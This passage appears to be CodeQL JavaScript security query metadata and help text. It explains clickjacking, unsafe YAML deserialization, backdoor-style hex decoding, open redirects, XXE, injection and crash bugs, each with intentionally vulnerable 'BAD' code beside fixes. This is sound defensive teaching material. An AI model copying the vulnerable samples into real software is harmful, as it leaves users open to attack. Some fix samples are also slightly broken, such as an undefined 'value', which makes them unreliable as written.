      Set the `X-Frame-Options` HTTP header to `DENY`, to instruct web browsers to block attempts to load the site in a frame. Alternatively, if framing is needed in certain circumstances, specify `SAMEORIGIN` or `ALLOW FROM: ...` to limit the ability to frame the site to pages from the same origin, or from an allowed whitelist of trusted domains.

      For [express](https://www.npmjs.com/package/express) applications, the header may be specified by setting `res.setHeader('X-Frame-Options', 'DENY')` on each request. Several npm modules provide this functionality as well: [frameguard](https://www.npmjs.com/package/frameguard), [helmet](https://www.npmjs.com/package/helmet), [x-frame-options](https://www.npmjs.com/package/x-frame-options)

      Alternatively, the header can be set by a proxy. As an example, a [HAProxy](http://www.haproxy.org/) configuration should contain: `rspadd X-Frame-Options:\ DENY` to set the header automatically.


      ## Example
      The following example shows an [express](https://www.npmjs.com/package/express) application that does *not* set the `X-Frame-Options` header on its responses:


      ```javascript
      var express = require('express'),
          app = express();


      app.get('/', function (req, res) {
          res.send('X-Frame-Options: ' + res.get('X-Frame-Options'))
      })

      ```
      The application can be made safer by setting the `X-Frame-Options` header before responding:


      ```javascript
      var express = require('express'),
          app = express();


      app.get('/', function (req, res) {
          res.set('X-Frame-Options', value)
          res.send('X-Frame-Options: ' + res.get('X-Frame-Options'))
      })

      ```

      ## References
      * OWASP: [Clickjacking Defense Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html).
      * Mozilla: [X-Frame-Options](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options)
      * Common Weakness Enumeration: [CWE-451](https://cwe.mitre.org/data/definitions/451.html).
      * Common Weakness Enumeration: [CWE-829](https://cwe.mitre.org/data/definitions/829.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Security/CWE-502/UnsafeDeserialization.ql
    relativeBqrsPath: codeql/javascript-queries/Security/CWE-502/UnsafeDeserialization.bqrs
    metadata:
      name: Deserialization of user-controlled data
      description: |-
        Deserializing user-controlled data may allow attackers to
                      execute arbitrary code.
      kind: path-problem
      problem.severity: warning
      security-severity: 9.8
      precision: high
      id: js/unsafe-deserialization
      tags: |-
        security
               external/cwe/cwe-502
    queryHelp: |
      # Deserialization of user-controlled data
      Deserializing untrusted data using any deserialization framework that allows the construction of arbitrary functions is easily exploitable and, in many cases, allows an attacker to execute arbitrary code.


      ## Recommendation
      Avoid deserialization of untrusted data if at all possible. If the architecture permits it, then use formats like JSON or XML that cannot represent functions. When using YAML or other formats that support the serialization and deserialization of functions, ensure that the parser is configured to disable deserialization of arbitrary functions.


      ## Example
      The following example calls the `load` function of the popular `js-yaml` package on data that comes from an HTTP request and hence is inherently unsafe.


      ```javascript
      const app = require("express")(),
        jsyaml = require("js-yaml");

      app.get("load", function(req, res) {
        let data = jsyaml.load(req.params.data);
        // ...
      });

      ```
      Using the `safeLoad` function instead (which does not deserialize YAML-encoded functions) removes the vulnerability.


      ```javascript
      const app = require("express")(),
        jsyaml = require("js-yaml");

      app.get("load", function(req, res) {
        let data = jsyaml.safeLoad(req.params.data);
        // ...
      });

      ```

      ## References
      * OWASP vulnerability description: [Deserialization of untrusted data](https://www.owasp.org/index.php/Deserialization_of_untrusted_data).
      * OWASP guidance on deserializing objects: [Deserialization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html).
      * Neal Poole: [Code Execution via YAML in JS-YAML Node.js Module](https://nealpoole.com/blog/2013/06/code-execution-via-yaml-in-js-yaml-nodejs-module/).
      * Common Weakness Enumeration: [CWE-502](https://cwe.mitre.org/data/definitions/502.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Security/CWE-506/HardcodedDataInterpretedAsCode.ql
    relativeBqrsPath: codeql/javascript-queries/Security/CWE-506/HardcodedDataInterpretedAsCode.bqrs
    metadata:
      name: Hard-coded data interpreted as code
      description: |-
        Transforming hard-coded data (such as hexadecimal constants) into code
                      to be executed is a technique often associated with backdoors and should
                      be avoided.
      kind: path-problem
      problem.severity: error
      security-severity: 9.1
      precision: medium
      id: js/hardcoded-data-interpreted-as-code
      tags: |-
        security
               external/cwe/cwe-506
    queryHelp: |
      # Hard-coded data interpreted as code
      Interpreting hard-coded data, such as string literals containing hexadecimal numbers, as code or as an import path is typical of malicious backdoor code that has been implanted into an otherwise trusted code base and is trying to hide its true purpose from casual readers or automated scanning tools.


      ## Recommendation
      Examine the code in question carefully to ascertain its provenance and its true purpose. If the code is benign, it should always be possible to rewrite it without relying on dynamically interpreting data as code, improving both clarity and safety.


      ## Example
      As an example of malicious code using this obfuscation technique, consider the following simplified version of a snippet of backdoor code that was discovered in a dependency of the popular `event-stream` npm package:


      ```javascript
      var r = require;

      function e(r) {
        return Buffer.from(r, "hex").toString()
      }

      // BAD: hexadecimal constant decoded and interpreted as import path
      var n = r(e("2e2f746573742f64617461"));

      ```
      While this shows only the first few lines of code, it already looks very suspicious since it takes a hard-coded string literal, hex-decodes it and then uses it as an import path. The only reason to do so is to hide the name of the file being imported.


      ## References
      * OWASP: [Trojan Horse](https://www.owasp.org/index.php/Trojan_Horse).
      * The npm Blog: [Details about the event-stream incident](https://blog.npmjs.org/post/180565383195/details-about-the-event-stream-incident).
      * Common Weakness Enumeration: [CWE-506](https://cwe.mitre.org/data/definitions/506.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Security/CWE-598/SensitiveGetQuery.ql
    relativeBqrsPath: codeql/javascript-queries/Security/CWE-598/SensitiveGetQuery.bqrs
    metadata:
      name: Sensitive data read from GET request
      description: |-
        Placing sensitive data in a GET request increases the risk of
                      the data being exposed to an attacker.
      kind: problem
      problem.severity: warning
      security-severity: 6.5
      precision: high
      id: js/sensitive-get-query
      tags: |-
        security
               external/cwe/cwe-598
    queryHelp: |
      # Sensitive data read from GET request
      Sensitive information such as user passwords should not be transmitted within the query string of the requested URL. Sensitive information within URLs may be logged in various locations, including the user's browser, the web server, and any forward or reverse proxy servers between the two endpoints. URLs may also be displayed on-screen, bookmarked or emailed around by users. They may be disclosed to third parties via the Referer header when any off-site links are followed. Placing sensitive information into the URL therefore increases the risk that it will be captured by an attacker.


      ## Recommendation
      Use HTTP POST to send sensitive information as part of the request body; for example, as form data.


      ## Example
      The following example shows two route handlers that both receive a username and a password. The first receives this sensitive information from the query parameters of a GET request, which is transmitted in the URL. The second receives this sensitive information from the request body of a POST request.


      ```javascript
      const express = require('express');
      const app = express();
      app.use(require('body-parser').urlencoded({ extended: false }))

      // bad: sensitive information is read from query parameters
      app.get('/login1', (req, res) => {
          const user = req.query.user;
          const password = req.query.password;
          if (checkUser(user, password)) {
              res.send('Welcome');
          } else {
              res.send('Access denied');
          }
      });

      // good: sensitive information is read from post body
      app.post('/login2', (req, res) => {
          const user = req.body.user;
          const password = req.body.password;
          if (checkUser(user, password)) {
              res.send('Welcome');
          } else {
              res.send('Access denied');
          }
      });

      ```

      ## References
      * CWE: [CWE-598: Use of GET Request Method with Sensitive Query Strings](https://cwe.mitre.org/data/definitions/598.html)
      * PortSwigger (Burp): [Password Submitted using GET Method](https://portswigger.net/kb/issues/00400300_password-submitted-using-get-method)
      * OWASP: [Information Exposure through Query Strings in URL](https://owasp.org/www-community/vulnerabilities/Information_exposure_through_query_strings_in_url)
      * Common Weakness Enumeration: [CWE-598](https://cwe.mitre.org/data/definitions/598.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Security/CWE-601/ClientSideUrlRedirect.ql
    relativeBqrsPath: codeql/javascript-queries/Security/CWE-601/ClientSideUrlRedirect.bqrs
    metadata:
      name: Client-side URL redirect
      description: |-
        Client-side URL redirection based on unvalidated user input
                      may cause redirection to malicious web sites.
      kind: path-problem
      problem.severity: error
      security-severity: 6.1
      precision: high
      id: js/client-side-unvalidated-url-redirection
      tags: |-
        security
               external/cwe/cwe-079
               external/cwe/cwe-116
               external/cwe/cwe-601
    queryHelp: |
      # Client-side URL redirect
      Redirecting to a URL that is constructed from parts of the DOM that may be controlled by an attacker can facilitate phishing attacks. In these attacks, unsuspecting users can be redirected to a malicious site that looks very similar to the real site they intend to visit, but which is controlled by the attacker.


      ## Recommendation
      To guard against untrusted URL redirection, it is advisable to avoid putting user input directly into a redirect URL. Instead, maintain a list of authorized redirects on the server; then choose from that list based on the user input provided.


      ## Example
      The following example uses a regular expression to extract a query parameter from the document URL, and then uses it to construct a new URL to redirect to without any further validation. This may allow an attacker to craft a link that redirects from a trusted website to some arbitrary website of their choosing, which facilitates phishing attacks:


      ```javascript
      window.location = /.*redirect=([^&]*).*/.exec(document.location.href)[1];

      ```

      ## References
      * OWASP: [ XSS Unvalidated Redirects and Forwards Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html).
      * Common Weakness Enumeration: [CWE-79](https://cwe.mitre.org/data/definitions/79.html).
      * Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).
      * Common Weakness Enumeration: [CWE-601](https://cwe.mitre.org/data/definitions/601.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Security/CWE-601/ServerSideUrlRedirect.ql
    relativeBqrsPath: codeql/javascript-queries/Security/CWE-601/ServerSideUrlRedirect.bqrs
    metadata:
      name: Server-side URL redirect
      description: |-
        Server-side URL redirection based on unvalidated user input
                      may cause redirection to malicious web sites.
      kind: path-problem
      problem.severity: warning
      security-severity: 6.1
      id: js/server-side-unvalidated-url-redirection
      tags: |-
        security
               external/cwe/cwe-601
      precision: high
    queryHelp: |
      # Server-side URL redirect
      Directly incorporating user input into a URL redirect request without validating the input can facilitate phishing attacks. In these attacks, unsuspecting users can be redirected to a malicious site that looks very similar to the real site they intend to visit, but which is controlled by the attacker.


      ## Recommendation
      To guard against untrusted URL redirection, it is advisable to avoid putting user input directly into a redirect URL. Instead, maintain a list of authorized redirects on the server; then choose from that list based on the user input provided.

      If this is not possible, then the user input should be validated in some other way, for example, by verifying that the target URL is on the same host as the current page.


      ## Example
      The following example shows an HTTP request parameter being used directly in a URL redirect without validating the input, which facilitates phishing attacks:


      ```javascript
      const app = require("express")();

      app.get("/redirect", function (req, res) {
        // BAD: a request parameter is incorporated without validation into a URL redirect
        res.redirect(req.query["target"]);
      });

      ```
      One way to remedy the problem is to validate the user input against a known fixed string before doing the redirection:


      ```javascript
      const app = require("express")();

      const VALID_REDIRECT = "http://cwe.mitre.org/data/definitions/601.html";

      app.get("/redirect", function (req, res) {
        // GOOD: the request parameter is validated against a known fixed string
        let target = req.query["target"];
        if (VALID_REDIRECT === target) {
          res.redirect(target);
        } else {
          res.redirect("/");
        }
      });

      ```
      Alternatively, we can check that the target URL does not redirect to a different host by parsing it relative to a base URL with a known host and verifying that the host stays the same:


      ```javascript
      const app = require("express")();

      function isLocalUrl(path) {
        try {
          return (
            // TODO: consider substituting your own domain for example.com
            new URL(path, "https://example.com").origin === "https://example.com"
          );
        } catch (e) {
          return false;
        }
      }

      app.get("/redirect", function (req, res) {
        // GOOD: check that we don't redirect to a different host
        let target = req.query["target"];
        if (isLocalUrl(target)) {
          res.redirect(target);
        } else {
          res.redirect("/");
        }
      });

      ```
      Note that as written, the above code will allow redirects to URLs on `example.com`, which is harmless but perhaps not intended. You can substitute your own domain (if known) for `example.com` to prevent this.


      ## References
      * OWASP: [ XSS Unvalidated Redirects and Forwards Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html).
      * Common Weakness Enumeration: [CWE-601](https://cwe.mitre.org/data/definitions/601.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Security/CWE-611/Xxe.ql
    relativeBqrsPath: codeql/javascript-queries/Security/CWE-611/Xxe.bqrs
    metadata:
      name: XML external entity expansion
      description: |-
        Parsing user input as an XML document with external
                      entity expansion is vulnerable to XXE attacks.
      kind: path-problem
      problem.severity: error
      security-severity: 9.1
      precision: high
      id: js/xxe
      tags: |-
        security
               external/cwe/cwe-611
               external/cwe/cwe-827
    queryHelp: |
      # XML external entity expansion
      Parsing untrusted XML files with a weakly configured XML parser may lead to an XML External Entity (XXE) attack. This type of attack uses external entity references to access arbitrary files on a system, carry out denial-of-service (DoS) attacks, or server-side request forgery. Even when the result of parsing is not returned to the user, DoS attacks are still possible and out-of-band data retrieval techniques may allow attackers to steal sensitive data.


      ## Recommendation
      The easiest way to prevent XXE attacks is to disable external entity handling when parsing untrusted data. How this is done depends on the library being used. Note that some libraries, such as recent versions of `libxml`, disable entity expansion by default, so unless you have explicitly enabled entity expansion, no further action needs to be taken.


      ## Example
      The following example uses the `libxml` XML parser to parse a string `xmlSrc`. If that string is from an untrusted source, this code may be vulnerable to an XXE attack, since the parser is invoked with the `noent` option set to `true`:


      ```javascript
      const app = require("express")(),
        libxml = require("libxmljs");

      app.post("upload", (req, res) => {
        let xmlSrc = req.body,
          doc = libxml.parseXml(xmlSrc, { noent: true });
      });

      ```
      To guard against XXE attacks, the `noent` option should be omitted or set to `false`. This means that no entity expansion is undertaken at all, not even for standard internal entities such as `&amp;` or `&gt;`. If desired, these entities can be expanded in a separate step using utility functions provided by libraries such as [underscore](http://underscorejs.org/#unescape), [lodash](https://lodash.com/docs/4.17.15#unescape) or [he](https://github.com/mathiasbynens/he).


      ```javascript
      const app = require("express")(),
        libxml = require("libxmljs");

      app.post("upload", (req, res) => {
        let xmlSrc = req.body,
          doc = libxml.parseXml(xmlSrc);
      });

      ```

      ## References
      * OWASP: [XML External Entity (XXE) Processing](https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing).
      * Timothy Morgen: [XML Schema, DTD, and Entity Attacks](https://research.nccgroup.com/2014/05/19/xml-schema-dtd-and-entity-attacks-a-compendium-of-known-techniques/).
      * Timur Yunusov, Alexey Osipov: [XML Out-Of-Band Data Retrieval](https://www.slideshare.net/qqlan/bh-ready-v4).
      * Common Weakness Enumeration: [CWE-611](https://cwe.mitre.org/data/definitions/611.html).
      * Common Weakness Enumeration: [CWE-827](https://cwe.mitre.org/data/definitions/827.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Security/CWE-614/ClearTextCookie.ql
    relativeBqrsPath: codeql/javascript-queries/Security/CWE-614/ClearTextCookie.bqrs
    metadata:
      name: Clear text transmission of sensitive cookie
      description: |-
        Sending sensitive information in a cookie without requring SSL encryption
                      can expose the cookie to an attacker.
      kind: problem
      problem.severity: warning
      security-severity: 5.0
      precision: high
      id: js/clear-text-cookie
      tags: |-
        security
               external/cwe/cwe-614
               external/cwe/cwe-311
               external/cwe/cwe-312
               external/cwe/cwe-319
    queryHelp: |
      # Clear text transmission of sensitive cookie
      Cookies that are transmitted in clear text can be intercepted by an attacker. If sensitive cookies are intercepted, the attacker can read the cookie and use it to perform actions on the user's behalf.


      ## Recommendation
      Always transmit sensitive cookies using SSL by setting the `secure` attribute on the cookie.


      ## Example
      The following example stores an authentication token in a cookie that can be transmitted in clear text.


      ```javascript
      const http = require('http');

      const server = http.createServer((req, res) => {
          res.setHeader("Set-Cookie", `authKey=${makeAuthkey()}`);
          res.writeHead(200, { 'Content-Type': 'text/html' });
          res.end('<h2>Hello world</h2>');
      });
      ```
      To force the cookie to be transmitted using SSL, set the `secure` attribute on the cookie.


      ```javascript
      const http = require('http');

      const server = http.createServer((req, res) => {
          res.setHeader("Set-Cookie", `authKey=${makeAuthkey()}; secure; httpOnly`);
          res.writeHead(200, { 'Content-Type': 'text/html' });
          res.end('<h2>Hello world</h2>');
      });
      ```

      ## References
      * ExpressJS: [Use cookies securely](https://expressjs.com/en/advanced/best-practice-security.html#use-cookies-securely).
      * OWASP: [Set cookie flags appropriately](https://cheatsheetseries.owasp.org/cheatsheets/Nodejs_Security_Cheat_Sheet.html#set-cookie-flags-appropriately).
      * Mozilla: [Set-Cookie](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie).
      * Common Weakness Enumeration: [CWE-614](https://cwe.mitre.org/data/definitions/614.html).
      * Common Weakness Enumeration: [CWE-311](https://cwe.mitre.org/data/definitions/311.html).
      * Common Weakness Enumeration: [CWE-312](https://cwe.mitre.org/data/definitions/312.html).
      * Common Weakness Enumeration: [CWE-319](https://cwe.mitre.org/data/definitions/319.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Security/CWE-640/HostHeaderPoisoningInEmailGeneration.ql
    relativeBqrsPath: codeql/javascript-queries/Security/CWE-640/HostHeaderPoisoningInEmailGeneration.bqrs
    metadata:
      name: Host header poisoning in email generation
      description: |-
        Using the HTTP Host header to construct a link in an email can facilitate phishing
                      attacks and leak password reset tokens.
      kind: path-problem
      problem.severity: error
      security-severity: 9.8
      precision: high
      id: js/host-header-forgery-in-email-generation
      tags: |-
        security
               external/cwe/cwe-640
    queryHelp: |
      # Host header poisoning in email generation
      Using the HTTP Host header to construct a link in an email can facilitate phishing attacks and leak password reset tokens. A malicious user can send an HTTP request to the targeted web site, but with a Host header that refers to his own web site. This means the emails will be sent out to potential victims, originating from a server they trust, but with links leading to a malicious web site.

      If the email contains a password reset link, and should the victim click the link, the secret reset token will be leaked to the attacker. Using the leaked token, the attacker can then construct the real reset link and use it to change the victim's password.


      ## Recommendation
      Obtain the server's host name from a configuration file and avoid relying on the Host header.


      ## Example
      The following example uses the `req.host` to generate a password reset link. This value is derived from the Host header, and can thus be set to anything by an attacker:


      ```javascript
      let nodemailer = require('nodemailer');
      let express = require('express');
      let backend = require('./backend');

      let app = express();

      let config = JSON.parse(fs.readFileSync('config.json', 'utf8'));

      app.post('/resetpass', (req, res) => {
        let email = req.query.email;
        let transport = nodemailer.createTransport(config.smtp);
        let token = backend.getUserSecretResetToken(email);
        transport.sendMail({
          from: 'webmaster@example.com',
          to: email,
          subject: 'Forgot password',
          text: `Click to reset password: https://${req.host}/resettoken/${token}`,
        });
      });

      ```
      To ensure the link refers to the correct web site, get the host name from a configuration file:


      ```javascript
      let nodemailer = require('nodemailer');
      let express = require('express');
      let backend = require('./backend');

      let app = express();

      let config = JSON.parse(fs.readFileSync('config.json', 'utf8'));

      app.post('/resetpass', (req, res) => {
        let email = req.query.email;
        let transport = nodemailer.createTransport(config.smtp);
        let token = backend.getUserSecretResetToken(email);
        transport.sendMail({
          from: 'webmaster@example.com',
          to: email,
          subject: 'Forgot password',
          text: `Click to reset password: https://${config.hostname}/resettoken/${token}`,
        });
      });

      ```

      ## References
      * Mitre: [CWE-640: Weak Password Recovery Mechanism for Forgotten Password](https://cwe.mitre.org/data/definitions/640.html).
      * Ian Muscat: [What is a Host Header Attack?](https://www.acunetix.com/blog/articles/automated-detection-of-host-header-attacks/).
      * Common Weakness Enumeration: [CWE-640](https://cwe.mitre.org/data/definitions/640.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Security/CWE-643/XpathInjection.ql
    relativeBqrsPath: codeql/javascript-queries/Security/CWE-643/XpathInjection.bqrs
    metadata:
      name: XPath injection
      description: |-
        Building an XPath expression from user-controlled sources is vulnerable to insertion of
                      malicious code by the user.
      kind: path-problem
      problem.severity: error
      security-severity: 9.8
      precision: high
      id: js/xpath-injection
      tags: |-
        security
               external/cwe/cwe-643
    queryHelp: |
      # XPath injection
      If an XPath expression is built using string concatenation, and the components of the concatenation include user input, it makes it very easy for a user to create a malicious XPath expression.


      ## Recommendation
      If user input must be included in an XPath expression, either sanitize the data or use variable references to safely embed it without altering the structure of the expression.


      ## Example
      In this example, the code accepts a user name specified by the user, and uses this unvalidated and unsanitized value in an XPath expression constructed using the `xpath` package. This is vulnerable to the user providing special characters or string sequences that change the meaning of the XPath expression to search for different values.


      ```javascript
      const express = require('express');
      const xpath = require('xpath');
      const app = express();

      app.get('/some/route', function(req, res) {
        let userName = req.param("userName");

        // BAD: Use user-provided data directly in an XPath expression
        let badXPathExpr = xpath.parse("//users/user[login/text()='" + userName + "']/home_dir/text()");
        badXPathExpr.select({
          node: root
        });
      });

      ```
      Instead, embed the user input using the variable replacement mechanism offered by `xpath`:


      ```javascript
      const express = require('express');
      const xpath = require('xpath');
      const app = express();

      app.get('/some/route', function(req, res) {
        let userName = req.param("userName");

        // GOOD: Embed user-provided data using variables
        let goodXPathExpr = xpath.parse("//users/user[login/text()=$userName]/home_dir/text()");
        goodXPathExpr.select({
          node: root,
          variables: { userName: userName }
        });
      });

      ```

      ## References
      * OWASP: [Testing for XPath Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/09-Testing_for_XPath_Injection).
      * OWASP: [XPath Injection](https://www.owasp.org/index.php/XPATH_Injection).
      * npm: [xpath](https://www.npmjs.com/package/xpath).
      * Common Weakness Enumeration: [CWE-643](https://cwe.mitre.org/data/definitions/643.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Security/CWE-693/InsecureHelmet.ql
    relativeBqrsPath: codeql/javascript-queries/Security/CWE-693/InsecureHelmet.bqrs
    metadata:
      name: Insecure configuration of Helmet security middleware
      description:
        The Helmet middleware is used to set security-related HTTP headers
        in Express applications. This query finds instances where the middleware is
        configured with important security features disabled.
      kind: problem
      problem.severity: error
      security-severity: 7.0
      precision: high
      id: js/insecure-helmet-configuration
      tags: |-
        security
                external/cwe/cwe-693
                external/cwe/cwe-1021
    queryHelp: |
      # Insecure configuration of Helmet security middleware
      [Helmet](https://helmetjs.github.io/) is a collection of middleware functions for securing Express apps. It sets various HTTP headers to guard against common web vulnerabilities. This query detects Helmet misconfigurations that can lead to security vulnerabilities, specifically:

      * Disabling frame protection
      * Disabling Content Security Policy
      Content Security Policy (CSP) helps spot and prevent injection attacks such as Cross-Site Scripting (XSS). Removing frame protections exposes an application to attacks such as clickjacking, where an attacker can trick a user into clicking on a button or link on a targeted page when they intended to click on the page carrying out the attack.

      Users of the query can extend the set of required Helmet features by adding additional checks for them, using CodeQL [data extensions](https://codeql.github.com/docs/codeql-language-guides/customizing-library-models-for-javascript/) in a [CodeQL model pack](https://docs.github.com/en/code-security/codeql-cli/using-the-advanced-functionality-of-the-codeql-cli/creating-and-working-with-codeql-packs#creating-a-codeql-model-pack). See `CUSTOMIZING.md` in the query source for more information.


      ## Recommendation
      To help mitigate these vulnerabilities, ensure that the following Helmet functions are not disabled, and are configured appropriately to your application:

      * `frameguard`
      * `contentSecurityPolicy`

      ## Example
      The following code snippet demonstrates Helmet configured in an insecure manner:


      ```javascript
      const helmet = require('helmet');

      app.use(helmet({
          frameguard: false,
          contentSecurityPolicy: false
      }));
      ```
      In this example, the defaults are used, which enables frame protection and a default Content Security Policy.


      ```javascript
      app.use(helmet());
      ```
      You can also enable a custom Content Security Policy by passing an object to the `contentSecurityPolicy` key. For example, taken from the [Helmet docs](https://helmetjs.github.io/#content-security-policy):


      ```javascript
      app.use(
          helmet({
              contentSecurityPolicy: {
                  directives: {
                      "script-src": ["'self'", "example.com"],
                      "style-src": null,
                  },
              },
          })
      );
      ```

      ## References
      * [helmet.js website](https://helmetjs.github.io/)
      * [Content Security Policy (CSP) | MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy)
      * [Mozilla Web Security Guidelines](https://infosec.mozilla.org/guidelines/web_security)
      * [Protect against clickjacking | MDN](https://developer.mozilla.org/en-US/docs/Web/Security#protect_against_clickjacking)
      * Common Weakness Enumeration: [CWE-693](https://cwe.mitre.org/data/definitions/693.html).
      * Common Weakness Enumeration: [CWE-1021](https://cwe.mitre.org/data/definitions/1021.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Security/CWE-730/RegExpInjection.ql
    relativeBqrsPath: codeql/javascript-queries/Security/CWE-730/RegExpInjection.bqrs
    metadata:
      name: Regular expression injection
      description: |-
        User input should not be used in regular expressions without first being escaped,
                      otherwise a malicious user may be able to inject an expression that could require
                      exponential time on certain inputs.
      kind: path-problem
      problem.severity: error
      security-severity: 7.5
      precision: high
      id: js/regex-injection
      tags: |-
        security
               external/cwe/cwe-730
               external/cwe/cwe-400
    queryHelp: |
      # Regular expression injection
      Constructing a regular expression with unsanitized user input is dangerous as a malicious user may be able to modify the meaning of the expression. In particular, such a user may be able to provide a regular expression fragment that takes exponential time in the worst case, and use that to perform a Denial of Service attack.


      ## Recommendation
      Before embedding user input into a regular expression, use a sanitization function such as lodash's `_.escapeRegExp` to escape meta-characters that have special meaning.


      ## Example
      The following example shows a HTTP request parameter that is used to construct a regular expression without sanitizing it first:


      ```javascript
      var express = require('express');
      var app = express();

      app.get('/findKey', function(req, res) {
        var key = req.param("key"), input = req.param("input");

        // BAD: Unsanitized user input is used to construct a regular expression
        var re = new RegExp("\\b" + key + "=(.*)\n");
      });

      ```
      Instead, the request parameter should be sanitized first, for example using the function `_.escapeRegExp` from the lodash package. This ensures that the user cannot insert characters which have a special meaning in regular expressions.


      ```javascript
      var express = require('express');
      var _ = require('lodash');
      var app = express();

      app.get('/findKey', function(req, res) {
        var key = req.param("key"), input = req.param("input");

        // GOOD: User input is sanitized before constructing the regex
        var safeKey = _.escapeRegExp(key);
        var re = new RegExp("\\b" + safeKey + "=(.*)\n");
      });

      ```

      ## References
      * OWASP: [Regular expression Denial of Service - ReDoS](https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS).
      * Wikipedia: [ReDoS](https://en.wikipedia.org/wiki/ReDoS).
      * npm: [lodash](https://www.npmjs.com/package/lodash).
      * Common Weakness Enumeration: [CWE-730](https://cwe.mitre.org/data/definitions/730.html).
      * Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Security/CWE-730/ServerCrash.ql
    relativeBqrsPath: codeql/javascript-queries/Security/CWE-730/ServerCrash.bqrs
    metadata:
      name: Server crash
      description: |-
        A server that can be forced to crash may be vulnerable to denial-of-service
                      attacks.
      kind: path-problem
      problem.severity: warning
      security-severity: 7.5
      precision: high
      id: js/server-crash
      tags: |-
        security
               external/cwe/cwe-248
               external/cwe/cwe-730
    queryHelp: |
      # Server crash
      Servers handle requests from clients until terminated deliberately by a server administrator. A client request that results in an uncaught server-side exception causes the current server response generation to fail, and should not have an effect on subsequent client requests.

      Under some circumstances, uncaught exceptions can however cause the entire server to terminate abruptly. Such a behavior is highly undesirable, especially if it gives malicious users the ability to turn off the server at will, which is an efficient denial-of-service attack.


      ## Recommendation
      Ensure that the processing of client requests can not cause uncaught exceptions to terminate the entire server abruptly.


      ## Example
      The following server code checks if a client-provided file path is valid before saving data to that path. It would be reasonable to expect that the server responds with an error in case the request contains an invalid file path. However, the server instead throws an exception, which is uncaught in the context of the asynchronous callback invocation (`fs.access(...)`). This causes the entire server to terminate abruptly.


      ```javascript
      const express = require("express"),
        fs = require("fs");

      function save(rootDir, path, content) {
        if (!isValidPath(rootDir, req.query.filePath)) {
          throw new Error(`Invalid filePath: ${req.query.filePath}`); // BAD crashes the server
        }
        // write content to disk
      }

      express().post("/save", (req, res) => {
        fs.access(rootDir, (err) => {
          if (err) {
            console.error(
              `Server setup is corrupted, ${rootDir} cannot be accessed!`
            );
            res.status(500);
            res.end();
            return;
          }
          save(rootDir, req.query.path, req.body);
          res.status(200);
          res.end();
        });
      });

      ```
      To remedy this, the server can catch the exception explicitly with a `try/catch` block, and generate an appropriate error response instead:


      ```javascript
      // ...
      express().post("/save", (req, res) => {
        fs.access(rootDir, (err) => {
          // ...
          try {
            save(rootDir, req.query.path, req.body); // GOOD exception is caught below
            res.status(200);
            res.end();
          } catch (e) {
            res.status(500);
            res.end();
          }
        });
      });

      ```
      To simplify exception handling, it may be advisable to switch to async/await syntax instead of using callbacks, which allows wrapping the entire request handler in a `try/catch` block:


      ```javascript
      // ...
      express().post("/save", async (req, res) => {
        try {
          await fs.promises.access(rootDir);
          save(rootDir, req.query.path, req.body); // GOOD exception is caught below
          res.status(200);
          res.end();
        } catch (e) {
          res.status(500);
          res.end();
        }
      });

      ```

      ## References
      * Common Weakness Enumeration: [CWE-248](https://cwe.mitre.org/data/definitions/248.html).
      * Common Weakness Enumeration: [CWE-730](https://cwe.mitre.org/data/definitions/730.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Security/CWE-754/UnvalidatedDynamicMethodCall.ql
    relativeBqrsPath: codeql/javascript-queries/Security/CWE-754/UnvalidatedDynamicMethodCall.bqrs
    metadata:
      name: Unvalidated dynamic method call
      description: |-
        Calling a method with a user-controlled name may dispatch to
                      an unexpected target, which could cause an exception.
      kind: path-problem
      problem.severity: warning
      security-severity: 7.5
      precision: high
      id: js/unvalidated-dynamic-method-call
      tags: |-
        security
               external/cwe/cwe-754
    queryHelp: |
      # Unvalidated dynamic method call
      JavaScript makes it easy to look up object properties dynamically at runtime. In particular, methods can be looked up by name and then called. However, if the method name is user-controlled, an attacker could choose a name that makes the application invoke an unexpected method, which may cause a runtime exception. If this exception is not handled, it could be used to mount a denial-of-service attack.

      For example, there might not be a method of the given name, or the result of the lookup might not be a function. In either case the method call will throw a `TypeError` at runtime.

      Another, more subtle example is where the result of the lookup is a standard library method from `Object.prototype`, which most objects have on their prototype chain. Examples of such methods include `valueOf`, `hasOwnProperty` and `__defineSetter__`. If the method call passes the wrong number or kind of arguments to these methods, they will throw an exception.


      ## Recommendation
      It is best to avoid dynamic method lookup involving user-controlled names altogether, for instance by using a `Map` instead of a plain object.

      If the dynamic method lookup cannot be avoided, consider whitelisting permitted method names. At the very least, check that the method is an own property and not inherited from the prototype object. If the object on which the method is looked up contains properties that are not methods, you should additionally check that the result of the lookup is a function. Even if the object only contains methods, it is still a good idea to perform this check in case other properties are added to the object later on.


      ## Example
      In the following example, an HTTP request parameter `action` property is used to dynamically look up a function in the `actions` map, which is then invoked with the `payload` parameter as its argument.


      ```javascript
      var express = require('express');
      var app = express();

      var actions = {
        play(data) {
          // ...
        },
        pause(data) {
